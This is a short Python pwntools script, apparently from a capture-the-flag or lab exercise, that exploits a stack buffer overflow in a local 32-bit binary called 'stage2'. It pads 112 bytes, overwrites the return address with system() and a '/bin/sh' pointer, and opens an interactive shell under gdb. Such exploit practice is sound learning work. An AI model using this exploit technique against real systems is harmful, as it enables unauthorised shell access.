#!/usr/bin/env python3

from pwn import *
from pprint import pprint

elf = ELF("./stage2")
#p = elf.process()
p = process(elf.path)

libc = ELF("/lib32/libc.so.6")
system_addr = libc.symbols["system"]
system_addr =  0x8049070 
print(hex(system_addr))

bin_sh_addr = next(elf.search(b'/bin/sh'))
bin_sh_addr = 0x804b021 
print(hex(bin_sh_addr))

gdb.attach(p, '''
break main
break read_input
break system
''')

print(p.recvline()) # welcome
#p.sendline(b"A"*112 + b"B"*4)
p.sendline(b"A"*112 + p32(system_addr) + b"BBBB"+ p32(bin_sh_addr) + b"DDDD")
p.interactive()

